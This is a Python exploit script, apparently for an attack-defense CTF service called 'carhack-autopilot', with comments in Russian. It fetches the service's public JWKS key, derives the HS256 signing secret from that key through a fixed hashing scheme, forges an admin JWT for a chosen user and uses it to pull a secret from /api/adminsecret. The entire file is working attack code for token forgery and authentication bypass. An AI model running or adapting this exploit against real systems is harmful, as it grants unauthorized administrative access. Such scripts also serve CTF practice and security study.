#!/usr/bin/env python3
"""vuln 6: секрет сервисных HS256-токенов выведен из публичного ключа. attack data = логин."""
import base64, hashlib, hmac, json, time
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from lib import args, emit, fail, http

host, user = args(1)


def b64(raw):
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def unb64(text):
    return base64.urlsafe_b64decode(text + "=" * (-len(text) % 4))


st, body = http(host, 8888, "GET", "/api/jwks")
if st != 200:
    fail("jwks недоступен, HTTP %s" % st)
jwk = json.loads(body)["keys"][0]
der = rsa.RSAPublicNumbers(
    int.from_bytes(unb64(jwk["e"]), "big"), int.from_bytes(unb64(jwk["n"]), "big")
).public_key().public_bytes(serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
secret = hashlib.sha256(b"carhack-autopilot/service-token/v1" + der).digest()

now = int(time.time())
head = b64(json.dumps({"alg": "HS256", "typ": "JWT", "kid": jwk["kid"]}, separators=(",", ":")).encode())
claims = b64(json.dumps({"iss": "carhack-autopilot", "sub": user, "role": "admin",
                         "iat": now, "exp": now + 3600, "jti": b64(now.to_bytes(8, "big"))},
                        separators=(",", ":")).encode())
sig = b64(hmac.new(secret, ("%s.%s" % (head, claims)).encode(), hashlib.sha256).digest())

st, body = http(host, 8888, "GET", "/api/adminsecret",
                headers={"Authorization": "Bearer %s.%s.%s" % (head, claims, sig)})
if st != 200:
    fail("токен отвергнут, HTTP %s" % st)
emit(json.loads(body)["secret"])
